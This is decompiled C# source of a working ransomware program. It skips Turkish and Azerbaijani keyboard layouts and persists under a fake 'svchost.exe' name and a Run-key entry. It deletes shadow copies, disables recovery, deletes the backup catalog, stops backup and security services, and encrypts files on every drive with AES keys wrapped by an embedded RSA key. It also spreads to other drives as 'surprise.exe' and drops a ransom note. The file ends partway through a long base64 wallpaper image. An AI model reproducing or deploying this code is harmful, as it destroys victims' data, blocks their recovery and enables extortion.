using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{
		// Token: 0x06000001 RID: 1
		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

		// Token: 0x06000002 RID: 2 RVA: 0x00002058 File Offset: 0x00000258
		private static void Main(string[] args)
		{
			if (Program.forbiddenCountry())
			{
				MessageBox.Show("Forbidden Country");
				return;
			}
			if (Program.RegistryValue())
			{
				new Thread(delegate()
				{
					Program.Run();
				}).Start();
			}
			if (Program.isOver())
			{
				return;
			}
			if (Program.AlreadyRunning())
			{
				Environment.Exit(1);
			}
			if (Program.checkSleep)
			{
				Program.sleepOutOfTempFolder();
			}
			if (Program.checkAdminPrivilage)
			{
				Program.copyResistForAdmin(Program.processName);
			}
			else if (Program.checkCopyRoaming)
			{
				Program.copyRoaming(Program.processName);
			}
			if (Program.checkStartupFolder)
			{
				Program.registryStartup();
			}
			if (Program.checkAdminPrivilage)
			{
				if (Program.checkdeleteShadowCopies)
				{
					Program.deleteShadowCopies();
				}
				if (Program.checkdisableRecoveryMode)
				{
					Program.disableRecoveryMode();
				}
				if (Program.checkdeleteBackupCatalog)
				{
					Program.deleteBackupCatalog();
				}
				if (Program.disableTaskManager)
				{
					Program.DisableTaskManager();
				}
				if (Program.checkStopBackupServices)
				{
					Program.stopBackupServices();
				}
			}
			Program.lookForDirectories();
			if (Program.checkSpread)
			{
				Program.spreadIt(Program.spreadName);
			}
			Program.addAndOpenNote();
			Program.SetWallpaper(Program.base64Image);
		}

		// Token: 0x06000003 RID: 3 RVA: 0x0000215F File Offset: 0x0000035F
		public static void Run()
		{
			Application.Run(new driveNotification.NotificationForm());
		}

		// Token: 0x06000004 RID: 4 RVA: 0x0000216C File Offset: 0x0000036C
		private static bool forbiddenCountry()
		{
			string[] array = new string[]
			{
				"az-Latn-AZ",
				"tr-TR"
			};
			foreach (string b in array)
			{
				try
				{
					string name = InputLanguage.CurrentInputLanguage.Culture.Name;
					if (name == b)
					{
						return true;
					}
				}
				catch
				{
				}
			}
			return false;
		}

		// Token: 0x06000005 RID: 5 RVA: 0x000021E8 File Offset: 0x000003E8
		private static void sleepOutOfTempFolder()
		{
			string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			if (directoryName != folderPath)
			{
				Thread.Sleep(Program.sleepTextbox * 1000);
			}
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002228 File Offset: 0x00000428
		private static bool RegistryValue()
		{
			bool result;
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + Program.appMutexRun2))
				{
					object value = registryKey.GetValue(Program.appMutexRun2);
					registryKey.Close();
					if (value.ToString().Length > 0)
					{
						result = false;
					}
					else
					{
						result = true;
					}
				}
			}
			catch
			{
				result = true;
			}
			return result;
		}

		// Token: 0x06000007 RID: 7 RVA: 0x000022A4 File Offset: 0x000004A4
		private static bool AlreadyRunning()
		{
			Process[] processes = Process.GetProcesses();
			Process currentProcess = Process.GetCurrentProcess();
			foreach (Process process in processes)
			{
				try
				{
					if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
					{
						return true;
					}
				}
				catch (Exception)
				{
				}
			}
			return false;
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002328 File Offset: 0x00000528
		public static string RandomString(int length)
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[Program.random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002378 File Offset: 0x00000578
		public static string RandomStringForExtension(int length)
		{
			if (Program.encryptedFileExtension == "")
			{
				StringBuilder stringBuilder = new StringBuilder();
				for (int i = 0; i < length; i++)
				{
					char value = "abcdefghijklmnopqrstuvwxyz0123456789"[Program.random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
					stringBuilder.Append(value);
				}
				return stringBuilder.ToString();
			}
			return Program.encryptedFileExtension;
		}

		// Token: 0x0600000A RID: 10 RVA: 0x000023DC File Offset: 0x000005DC
		public static string Base64EncodeString(string plainText)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(plainText);
			return Convert.ToBase64String(bytes);
		}

		// Token: 0x0600000B RID: 11 RVA: 0x000025FC File Offset: 0x000007FC
		private static void encryptDirectory(string location)
		{
			try
			{
				string[] files = Directory.GetFiles(location);
				bool checkCrypted = true;
				Parallel.For(0, files.Length, delegate(int i)
				{
					try
					{
						string extension = Path.GetExtension(files[i]);
						string fileName = Path.GetFileName(files[i]);
						if (Array.Exists<string>(Program.validExtensions, (string E) => E == extension.ToLower()) && fileName != Program.droppedMessageTextbox)
						{
							FileInfo fileInfo = new FileInfo(files[i]);
							try
							{
								fileInfo.Attributes = FileAttributes.Normal;
							}
							catch
							{
							}
							string text = Program.CreatePassword(40);
							if (fileInfo.Length < (long)((ulong)-1926258176))
							{
								if (Program.checkDirContains(files[i]))
								{
									string keyRSA = Program.RSA_Encrypt(text, Program.rsaKey());
									Program.AES_Encrypt(files[i], text, keyRSA);
								}
							}
							else
							{
								Program.AES_Encrypt_Large(files[i], text, fileInfo.Length);
							}
							if (checkCrypted)
							{
								checkCrypted = false;
								string path = location + "/" + Program.droppedMessageTextbox;
								string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
								if (!File.Exists(path) && location != folderPath)
								{
									File.WriteAllLines(path, Program.messages);
								}
							}
						}
					}
					catch (Exception)
					{
					}
				});
				string[] childDirectories = Directory.GetDirectories(location);
				Parallel.For(0, childDirectories.Length, delegate(int i)
				{
					try
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(childDirectories[i]);
						directoryInfo.Attributes &= ~FileAttributes.Normal;
					}
					catch
					{
					}
					Program.encryptDirectory(childDirectories[i]);
				});
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002698 File Offset: 0x00000898
		private static bool checkDirContains(string directory)
		{
			directory = directory.ToLower();
			string[] array = new string[]
			{
				"appdata\\local",
				"appdata\\locallow",
				"users\\all users",
				"\\ProgramData",
				"boot.ini",
				"bootfont.bin",
				"boot.ini",
				"iconcache.db",
				"ntuser.dat",
				"ntuser.dat.log",
				"ntuser.ini",
				"thumbs.db",
				"autorun.inf",
				"bootsect.bak",
				"bootmgfw.efi",
				"desktop.ini"
			};
			foreach (string value in array)
			{
				if (directory.Contains(value))
				{
					return false;
				}
			}
			return true;
		}

		// Token: 0x0600000D RID: 13 RVA: 0x0000276C File Offset: 0x0000096C
		public static string rsaKey()
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
			stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
			stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
			stringBuilder.AppendLine("  <Modulus>0NkBXyBccblrRkj4kZaeaiw5NAalrt650lXXgqYpNPykigo7zEkhS3shCp7IX1VOEpNHRrzupyUMpVoBfVGSX2n6JI9gGKtZMltbKM/kRU+loTUPHawxNFds9LVLFGwZcHtxLxz71hRrL3kvVPTi98scKXrii240x1LuiMgHDr0zGcLZ6GPluBNNtVdoTTtDPSv5kdGqtBlfBRO5z89Mto/lkgET4YWR+WujzTVBw0zaKg3qf4/4kW/2GT5F2rid56WQosicTgrv/14Z/P5BnMpxujNbwGU/wVPj9Op1Vazv7IMq1LkO5TgBXhTILonhdXkDpihOTE/OSOlHBm17lQ==</Modulus>");
			stringBuilder.AppendLine("</RSAParameters>");
			return stringBuilder.ToString();
		}

		// Token: 0x0600000E RID: 14 RVA: 0x000027C4 File Offset: 0x000009C4
		public static string CreatePassword(int length)
		{
			StringBuilder stringBuilder = new StringBuilder();
			Random random = new Random();
			while (0 < length--)
			{
				stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00002818 File Offset: 0x00000A18
		private static void AES_Encrypt(string inputFile, string password, string keyRSA)
		{
			string path = inputFile + "." + Program.RandomStringForExtension(4);
			byte[] array = new byte[]
			{
				1,
				2,
				3,
				4,
				5,
				6,
				7,
				8
			};
			FileStream fileStream = new FileStream(path, FileMode.Create);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 128;
			rijndaelManaged.BlockSize = 128;
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			fileStream.Write(array, 0, array.Length);
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
			fileStream2.CopyTo(cryptoStream);
			fileStream2.Flush();
			fileStream2.Close();
			cryptoStream.Flush();
			cryptoStream.Close();
			fileStream.Close();
			using (FileStream fileStream3 = new FileStream(path, FileMode.Append, FileAccess.Write))
			{
				using (StreamWriter streamWriter = new StreamWriter(fileStream3))
				{
					streamWriter.Write(keyRSA);
					streamWriter.Flush();
					streamWriter.Close();
				}
			}
			File.WriteAllText(inputFile, "?");
			File.Delete(inputFile);
		}

		// Token: 0x06000010 RID: 16 RVA: 0x00002988 File Offset: 0x00000B88
		private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
		{
			Program.GenerateRandomSalt();
			using (FileStream fileStream = new FileStream(inputFile + "." + Program.RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None))
			{
				fileStream.SetLength(lenghtBytes);
				File.WriteAllText(inputFile, "?");
				File.Delete(inputFile);
			}
		}

		// Token: 0x06000011 RID: 17 RVA: 0x000029EC File Offset: 0x00000BEC
		public static byte[] GenerateRandomSalt()
		{
			byte[] array = new byte[32];
			using (RNGCryptoServiceProvider rngcryptoServiceProvider = new RNGCryptoServiceProvider())
			{
				for (int i = 0; i < 10; i++)
				{
					rngcryptoServiceProvider.GetBytes(array);
				}
			}
			return array;
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00002A38 File Offset: 0x00000C38
		public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
			string result;
			using (RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider(2048))
			{
				try
				{
					rsacryptoServiceProvider.FromXmlString(publicKeyString.ToString());
					byte[] inArray = rsacryptoServiceProvider.Encrypt(bytes, true);
					string text = Convert.ToBase64String(inArray);
					result = text;
				}
				finally
				{
					rsacryptoServiceProvider.PersistKeyInCsp = false;
				}
			}
			return result;
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00002AC8 File Offset: 0x00000CC8
		private static void lookForDirectories()
		{
			foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
			{
				string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
				if (driveInfo.ToString() == pathRoot)
				{
					string[] array = new string[]
					{
						"Program Files",
						"Program Files (x86)",
						"Windows",
						"$Recycle.Bin",
						"MSOCache",
						"Documents and Settings",
						"Intel",
						"PerfLogs",
						"Windows.old",
						"AMD",
						"NVIDIA",
						"ProgramData"
					};
					string[] directories = Directory.GetDirectories(pathRoot);
					for (int j = 0; j < directories.Length; j++)
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
						string dirName = directoryInfo.Name;
						if (!Array.Exists<string>(array, (string E) => E == dirName))
						{
							Program.encryptDirectory(directories[j]);
						}
					}
				}
				else
				{
					Program.encryptDirectory(driveInfo.ToString());
				}
			}
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002BF8 File Offset: 0x00000DF8
		private static void copyRoaming(string processName)
		{
			string friendlyName = AppDomain.CurrentDomain.FriendlyName;
			string location = Assembly.GetExecutingAssembly().Location;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
			string text2 = text + processName;
			if (friendlyName != processName || location != text2)
			{
				byte[] bytes = File.ReadAllBytes(location);
				if (!File.Exists(text2))
				{
					File.WriteAllBytes(text2, bytes);
					ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
					processStartInfo.WorkingDirectory = text;
					if (new Process
					{
						StartInfo = processStartInfo
					}.Start())
					{
						Environment.Exit(1);
						return;
					}
				}
				else
				{
					try
					{
						File.Delete(text2);
						Thread.Sleep(200);
						File.WriteAllBytes(text2, bytes);
					}
					catch
					{
					}
					ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
					processStartInfo2.WorkingDirectory = text;
					if (new Process
					{
						StartInfo = processStartInfo2
					}.Start())
					{
						Environment.Exit(1);
					}
				}
			}
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002CF8 File Offset: 0x00000EF8
		private static void copyResistForAdmin(string processName)
		{
			string friendlyName = AppDomain.CurrentDomain.FriendlyName;
			string location = Assembly.GetExecutingAssembly().Location;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
			string text2 = text + processName;
			ProcessStartInfo startInfo = new ProcessStartInfo(text2)
			{
				UseShellExecute = true,
				Verb = "runas",
				WindowStyle = ProcessWindowStyle.Normal,
				WorkingDirectory = text
			};
			Process process = new Process();
			process.StartInfo = startInfo;
			if (friendlyName != processName || location != text2)
			{
				byte[] bytes = File.ReadAllBytes(location);
				if (!File.Exists(text2))
				{
					File.WriteAllBytes(text2, bytes);
					try
					{
						Process.Start(startInfo);
						Environment.Exit(1);
						return;
					}
					catch (Win32Exception ex)
					{
						if (ex.NativeErrorCode == 1223)
						{
							Program.copyResistForAdmin(processName);
						}
						return;
					}
				}
				try
				{
					File.Delete(text2);
					Thread.Sleep(200);
					File.WriteAllBytes(text2, bytes);
				}
				catch
				{
				}
				try
				{
					Process.Start(startInfo);
					Environment.Exit(1);
				}
				catch (Win32Exception ex2)
				{
					if (ex2.NativeErrorCode == 1223)
					{
						Program.copyResistForAdmin(processName);
					}
				}
			}
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00002E40 File Offset: 0x00001040
		private static void addLinkToStartup()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
			string str = Process.GetCurrentProcess().ProcessName;
			using (StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + str + ".url"))
			{
				string location = Assembly.GetExecutingAssembly().Location;
				streamWriter.WriteLine("[InternetShortcut]");
				streamWriter.WriteLine("URL=file:///" + location);
				streamWriter.WriteLine("IconIndex=0");
				string str2 = location.Replace('\\', '/');
				streamWriter.WriteLine("IconFile=" + str2);
			}
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00002EE4 File Offset: 0x000010E4
		private static void addAndOpenNote()
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Program.droppedMessageTextbox;
			try
			{
				if (!File.Exists(text))
				{
					File.WriteAllLines(text, Program.messages);
				}
				Thread.Sleep(500);
				Process.Start(text);
			}
			catch
			{
			}
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00002F44 File Offset: 0x00001144
		private static bool isOver()
		{
			string location = Assembly.GetExecutingAssembly().Location;
			string b = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Program.processName;
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Program.droppedMessageTextbox;
			if (location != b)
			{
				try
				{
					File.Delete(path);
				}
				catch
				{
				}
			}
			return File.Exists(path) && location == b;
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00002FC4 File Offset: 0x000011C4
		private static void registryStartup()
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
				registryKey.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
			}
			catch
			{
			}
		}

		// Token: 0x0600001A RID: 26 RVA: 0x0000300C File Offset: 0x0000120C
		private static void spreadIt(string spreadName)
		{
			foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
			{
				if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
				{
					try
					{
						File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
					}
					catch
					{
					}
				}
			}
		}

		// Token: 0x0600001B RID: 27 RVA: 0x0000308C File Offset: 0x0000128C
		private static void runCommand(string commands)
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				FileName = "cmd.exe",
				Arguments = "/C " + commands,
				WindowStyle = ProcessWindowStyle.Hidden
			};
			process.Start();
			process.WaitForExit();
		}

		// Token: 0x0600001C RID: 28 RVA: 0x000030DC File Offset: 0x000012DC
		private static void deleteShadowCopies()
		{
			Program.runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
		}

		// Token: 0x0600001D RID: 29 RVA: 0x000030E8 File Offset: 0x000012E8
		private static void disableRecoveryMode()
		{
			Program.runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
		}

		// Token: 0x0600001E RID: 30 RVA: 0x000030F4 File Offset: 0x000012F4
		private static void deleteBackupCatalog()
		{
			Program.runCommand("wbadmin delete catalog -quiet");
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00003100 File Offset: 0x00001300
		public static void DisableTaskManager()
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey.SetValue("DisableTaskMgr", "1");
				registryKey.Close();
			}
			catch
			{
			}
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00003148 File Offset: 0x00001348
		private static void stopBackupServices()
		{
			string[] array = new string[]
			{
				"BackupExecAgentBrowser",
				"BackupExecDiveciMediaService",
				"BackupExecJobEngine",
				"BackupExecManagementService",
				"vss",
				"sql",
				"svc$",
				"memtas",
				"sophos",
				"veeam",
				"backup",
				"GxVss",
				"GxBlr",
				"GxFWD",
				"GxCVD",
				"GxCIMgr",
				"DefWatch",
				"ccEvtMgr",
				"SavRoam",
				"RTVscan",
				"QBFCService",
				"Intuit.QuickBooks.FCS",
				"YooBackup",
				"YooIT",
				"zhudongfangyu",
				"sophos",
				"stc_raw_agent",
				"VSNAPVSS",
				"QBCFMonitorService",
				"VeeamTransportSvc",
				"VeeamDeploymentService",
				"VeeamNFSSvc",
				"veeam",
				"PDVFSService",
				"BackupExecVSSProvider",
				"BackupExecAgentAccelerator",
				"BackupExecRPCService",
				"AcrSch2Svc",
				"AcronisAgent",
				"CASAD2DWebSvc",
				"CAARCUpdateSvc",
				"TeamViewer"
			};
			foreach (string name in array)
			{
				try
				{
					ServiceController serviceController = new ServiceController(name);
					serviceController.Stop();
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00003310 File Offset: 0x00001510
		public static void SetWallpaper(string base64)
		{
			if (base64 != "")
			{
				try
				{
					string text = Path.GetTempPath() + Program.RandomString(9) + ".jpg";
					File.WriteAllBytes(text, Convert.FromBase64String(base64));
					Program.SystemParametersInfo(20U, 0U, text, 3U);
				}
				catch
				{
				}
			}
		}

		// Token: 0x04000001 RID: 1
		private static readonly byte[] _salt = new byte[32];

		// Token: 0x04000002 RID: 2
		private static string userName = Environment.UserName;

		// Token: 0x04000003 RID: 3
		private static string userDir = "C:\\Users\\";

		// Token: 0x04000004 RID: 4
		public static string appMutexRun = "v45hchdrg72ns7m6jmy";

		// Token: 0x04000005 RID: 5
		public static bool encryptionAesRsa = true;

		// Token: 0x04000006 RID: 6
		public static string encryptedFileExtension = "";

		// Token: 0x04000007 RID: 7
		private static bool checkSpread = true;

		// Token: 0x04000008 RID: 8
		private static string spreadName = "surprise.exe";

		// Token: 0x04000009 RID: 9
		private static bool checkCopyRoaming = true;

		// Token: 0x0400000A RID: 10
		private static string processName = "svchost.exe";

		// Token: 0x0400000B RID: 11
		public static string appMutexRun2 = "oAnWieozQPsRK7Bj83r4";

		// Token: 0x0400000C RID: 12
		private static bool checkStartupFolder = true;

		// Token: 0x0400000D RID: 13
		private static bool checkSleep = false;

		// Token: 0x0400000E RID: 14
		private static int sleepTextbox = 10;

		// Token: 0x0400000F RID: 15
		private static string base64Image = "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